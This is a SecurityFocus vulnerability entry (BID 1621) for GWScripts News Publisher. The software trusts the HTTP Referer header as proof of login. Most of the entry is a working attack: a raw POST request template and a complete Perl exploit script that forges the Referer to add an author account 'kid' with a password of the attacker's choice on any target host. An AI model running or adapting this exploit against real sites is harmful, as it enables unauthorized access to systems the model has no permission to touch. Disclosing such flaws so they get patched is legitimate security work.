source: http://www.securityfocus.com/bid/1621/info

It is possible for a remote user to add an author to the author index (author.file) in GWScripts News Publisher, a web news publisher. This can be done by requesting the following raw HTTP request using any arbitrary username and password:

POST /cgi-bin/news/news.cgi?addAuthor HTTP/1.0
Connection: close
User-Agent: user/browser
Host: target
Referer: http://target/cgi-bin/news/news.cgi
Content-type: application/x-www-form-urlencoded
Content-length: 71

author=<username>&apassword=<password>&email=<email address>&name=<username>&password=<password>

#!/usr/bin/perl
#  
# News Publisher EXPLOIT by n30
# Versions: tested on 1.05
#		      1.05a
#		      1.05b
#           	      1.06
# Bug Found By: me {n30}
# OS: Unix and Winnt
#
# The Problem:
#	The author decided in all his 'enlightened wisdom'
# that if the HTTP_REFERER url is the same as the News Publisher
# news.cgi file. Then U have OBVIOUSLY logged in?
#
# Exploit:
#	hmmm me thinks i should change the HTTP_REFERER to:
#
#	http://www.server.com/cgi/news.cgi
#
#	Using this exploit will add an author account with user kid
#	and passwerd of ur choice.
#
# NOTE: There are more inventive ways to use this Vulnerability :)
#	ie. maybe?? the Admin screen is protected by the HTTP_REFERER?
#
# n30@alldas.de
# www.alldas.de, defaced.alldas.de {trib's the webmaster not me!}
#
# Shoutz: trib, axess, domz, acidflame, raxie,  and all who know me!
#

use strict;
use Socket;

print("\nNews Publisher EXPLOIT\n");
print("By: n30 {n30\@alldas.de}\n");
print("\nShoutz: trib, axess, domz, acidflame, raxie\n");

if (@ARGV < 3) {
    print("\nUsage: $0 <target> <dir> <newpass>\n");
    print("\n   eg => ./sploit.pl www.example.com cgi-bin/news.cgi iisalamer\n");
    exit(1);
}

(my $target,my $dir,my $newpass) = @ARGV;

# Setup Content-Length Header :)
my $length = 68 + (2 * length($newpass));

# Print BullShit
print("\nRemote host: $target\n");
print("CGI-script: $dir\n");
print("URL: http://$target/$dir\n");

# Setup URL Command
my $url = "author=kid&apassword=$newpass&email=lamerz\@antionline.com&name=kid&password=$newpass";
print("URL Command: $url\n");
# Necessary to DE-Kiddie da werld :)
my $agent = "-=Attention Admin=- pLz n0te d0wn th1s IP and P4ss ont0 fBi";

my $sploit=
"POST /$dir?addAuthor HTTP/1.0
Connection: close
User-Agent: $agent
Host: $target
Referer: http://$target/$dir
Content-type: application/x-www-form-urlencoded
Content-length: $length

$url";

my $iaddr = inet_aton($target)                     || die("Error: $!\n");
my $paddr = sockaddr_in(80, $iaddr)                || die("Error: $!\n");
my $proto = getprotobyname('tcp')                  || die("Error: $!\n");

socket(SOCKET, PF_INET, SOCK_STREAM, $proto)    || die("Error: $!\n");
connect(SOCKET, $paddr)                         || die("Error: $!\n");
send(SOCKET,"$sploit\015\012", 0)               || die("Error: $!\n");
close(SOCKET);

print("\nWh0a chex0r: http://$target/$dir\nuser/pass: kid/$newpass\n");

exit(0);